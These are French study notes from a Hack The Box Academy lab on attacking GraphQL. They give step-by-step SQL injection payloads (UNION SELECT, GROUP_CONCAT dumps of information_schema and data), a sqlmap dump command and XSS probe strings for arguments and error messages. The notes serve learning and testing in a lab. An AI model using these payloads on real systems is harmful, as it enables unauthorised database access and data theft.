---
titre: "Injection Attacks — SQLi & XSS via GraphQL"
aliases:
  - "Injection Attacks — SQLi & XSS via GraphQL"
plateforme: "Hack The Box Academy"
module: "Attacking GraphQL"
date: 2026-07-06
tags: [HTB, GraphQL, SQLi, XSS, Injection, UNION, Notes]
---

# 💉 Injection Attacks — SQLi & XSS via GraphQL

Lié : [[Attacking GraphQL - Index]] · [[04 - IDOR]] · [[09 - Cheatsheet GraphQL]]

---

## Le concept

Les arguments GraphQL sont des **valeurs contrôlées par le client**, passées au resolver backend. Si le resolver construit une requête SQL par concaténation (au lieu de paramétrer), l'argument devient un **point d'injection** — exactement comme un paramètre GET/POST en REST.

---

## SQL Injection

### Étape 1 — Identifier les arguments injectables

Lister toutes les queries qui acceptent des arguments String (via introspection) :
```graphql
{ __schema { queryType { fields { name args { name type { name kind } } } } } }
```
Candidats : `user(username:)`, `postByAuthor(author:)`, `productByName(name:)`, `customerByName(lastName:)`…

### Étape 2 — Confirmer l'injection

Envoyer une **apostrophe** et observer la réaction :

```graphql
{ user(username: "test'") { username } }
```

| Réponse | Signification |
|---|---|
| Erreur SQL (`syntax error near...`, `OperationalError`) | ✅ **Injectable** |
| `null` ou pas de données (silencieux) | Possible blind SQLi — tester `test' -- -` |
| Données normales | Argument paramétré → pas de SQLi ici |

**Confirmation blind SQLi :**
```graphql
{ user(username: "test' -- -") { username } }
```
Si les données de `test` reviennent → le `-- -` a commenté le guillemet fermant → SQLi confirmée.

### Étape 3 — Trouver le nombre de colonnes

Le nombre de colonnes du UNION = **nombre de champs du type retourné**. L'introspection te le donne gratuitement (pas besoin de tâtonner avec `ORDER BY`) :

```
UserObject : id, username, employeeId, role = 4 champs → UNION SELECT 1,2,3,4
UserObject (autre box) : uuid, id, username, password, role, msg = 6 champs → UNION SELECT 1,2,3,4,5,6
```

### Étape 4 — Identifier le mapping position → champ

```graphql
{ user(username: "x' UNION SELECT 1,2,3,4,5,6 -- -") { username } }
```
→ Si `username` affiche `3` → la position 3 dans le UNION correspond au champ `username`. C'est dans cette position que tu mettras tes extractions.

### Étape 5 — Dumper les tables

```graphql
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database() -- -") {
    username
  }
}
```
→ `username` contient la liste des tables : `user,secret,flag,post`.

### Étape 6 — Dumper les colonnes d'une table cible

```graphql
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_schema=database() AND table_name='flag' -- -") {
    username
  }
}
```

### Étape 7 — Exfiltrer les données

```graphql
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(flag),4,5,6 FROM flag -- -") {
    username
  }
}
```
→ `HTB{...}` dans le champ `username`.

---

### Points clés (spécificités GraphQL)

- **`GROUP_CONCAT` obligatoire** : GraphQL renvoie souvent **un seul objet** (pas une liste) → sans `GROUP_CONCAT`, tu ne vois qu'une ligne à la fois.
- **Le nombre de colonnes est donné par l'introspection** : tu comptes les champs du type retourné. Énorme gain vs. le brute-force `ORDER BY` en SQLi classique.
- **La SQLi sort du bac à sable GraphQL** : le schéma GraphQL n'expose peut-être pas la table `flag`, mais elle est en base et la SQLi y accède directement. C'est **le** message de cette section.
- **Échappement JSON** : dans le body JSON, les `"` internes doivent être échappés en `\"`. Les `'` ne posent pas de problème.

### sqlmap sur GraphQL

Sauvegarder la requête Burp dans un fichier, marquer le point d'injection avec `*` :

```http
POST /graphql HTTP/1.1
Host: <TARGET>
Content-Type: application/json
Cookie: session=<cookie>

{"query":"{ user(username: \"test*\") { username } }"}
```

```bash
sqlmap -r req.txt --batch --dump
```

---

## Cross-Site Scripting (XSS)

### Via les arguments

Si un argument est **reflété** dans une réponse HTML sans encodage :
```graphql
{ user(username: "<script>alert(1)</script>") { username } }
```
→ Rarement exploitable car les réponses GraphQL sont du JSON (pas du HTML).

### Via les messages d'erreur

Plus intéressant : si un argument **invalide** est reflété dans un message d'erreur :
```graphql
{ post(id: "<script>alert(1)</script>") { title } }
```
→ L'erreur contient : `Cannot parse value "<script>alert(1)</script>", expected type Int`
→ Si cette erreur est **insérée dans une page HTML sans encodage** → XSS.

⚠️ En pratique dans le lab, la page "casse" mais le XSS ne se déclenche pas (le front gère mal l'erreur et n'injecte pas le payload dans le DOM). Mais le vecteur est réel sur d'autres implémentations.

---

## Résumé des vecteurs d'injection

| Vecteur | Test | Payload |
|---|---|---|
| SQLi (argument String) | `test'` | `x' UNION SELECT ... -- -` |
| Blind SQLi | `test' -- -` (données reviennent ?) | `x' AND 1=1 -- -` vs `x' AND 1=2 -- -` |
| XSS (erreur reflétée) | `<script>alert(1)</script>` dans un argument typé Int | Dépend du contexte HTML |
